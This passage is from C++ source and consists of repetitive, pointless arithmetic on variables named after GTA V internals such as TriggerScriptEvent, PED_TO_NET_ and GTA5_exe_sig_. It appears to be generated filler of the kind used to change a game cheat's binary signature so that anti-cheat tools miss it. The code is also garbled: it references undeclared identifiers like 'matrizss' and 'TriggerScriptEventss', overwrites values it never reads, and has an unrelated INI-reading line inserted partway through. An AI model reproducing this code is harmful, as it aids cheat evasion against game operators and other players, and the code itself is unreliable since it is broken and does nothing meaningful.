				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Spawn.PosX = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosX");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
